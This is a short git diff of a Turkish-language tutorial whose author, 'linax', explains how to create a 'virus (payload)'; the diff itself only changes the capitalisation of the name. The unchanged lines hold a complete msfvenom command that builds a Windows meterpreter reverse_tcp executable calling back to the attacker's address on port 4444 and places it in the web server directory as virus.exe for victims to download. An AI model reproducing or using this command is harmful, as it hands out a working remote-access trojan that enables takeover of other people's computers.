@@ -1,4 +1,4 @@
-## Selam Ben Linax Ve Bugun Sizlere Nasil Virus(payload) Olusturulucagini Anlaticam.
+## Selam Ben linax Ve Bugun Sizlere Nasil Virus(payload) Olusturulucagini Anlaticam.
 ## Oncelikle Terminali Aciyoruz Ve msfvenom Ile Komutumuzu Yaziyoruz.
 ## msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Local Ipniz> LPORT=4444 -f exe > /var/www/html/virus.exe 
   
